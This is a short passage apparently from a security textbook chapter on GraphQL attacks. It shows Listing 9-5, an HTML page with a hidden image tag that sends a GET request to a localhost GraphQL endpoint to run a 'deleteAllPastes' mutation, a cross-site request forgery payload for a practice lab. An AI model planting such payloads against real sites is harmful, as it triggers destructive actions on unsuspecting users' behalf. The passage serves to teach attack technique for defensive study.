    <body>\n<h1>GET-based CSRF using an image tag</h1>\n<img src=\"http://localhost:5013/graphql?query={deleteAllPastes}\"\
    \ style=\"display: none;\" />\n</body>\n</html>\n```\n\nListing 9-5: GET-based\
    \ CSRF using image tags\n\nSave this as an HTML file. As before, it will execute\
